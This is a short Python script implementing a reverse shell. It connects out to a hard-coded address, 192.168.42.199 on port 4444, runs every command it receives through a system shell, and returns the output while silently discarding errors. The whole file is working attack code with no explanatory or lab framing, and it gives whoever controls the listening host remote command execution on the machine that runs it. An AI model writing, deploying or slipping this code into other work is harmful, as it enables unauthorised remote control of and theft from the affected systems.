import socket
import subprocess
import os

def reverse_shell(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        while True:
            s.send(b"$ ")  # shell prompt
            cmd = s.recv(1024).decode().strip()
            if cmd.lower() == "exit":
                break
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            s.send(output)
        s.close()
    except Exception:
        pass

if __name__ == "__main__":
    reverse_shell("192.168.42.199", 4444)
